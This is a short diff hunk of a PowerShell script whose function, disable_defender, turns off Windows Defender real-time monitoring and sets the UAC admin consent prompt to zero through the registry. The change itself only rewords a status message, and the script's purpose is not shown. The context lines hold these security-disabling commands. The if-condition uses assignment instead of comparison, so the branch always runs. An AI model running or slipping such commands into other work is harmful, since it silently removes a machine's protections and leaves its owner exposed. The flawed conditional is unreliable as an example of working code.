@@ -28,7 +28,7 @@ function disable_defender {
     $UAC_status = Get-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin | % {$_.ConsentPromptBehaviorAdmin}
     
     if ($results = "False") {
-        Write-Host "Disabling Windows Defender";
+        Write-Host "Disabling Windows Defender and UAC. . .";
         Set-MpPreference -DisableRealtimeMonitoring $True;
     } elseif ($UAC_status -ne 0) {
         Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
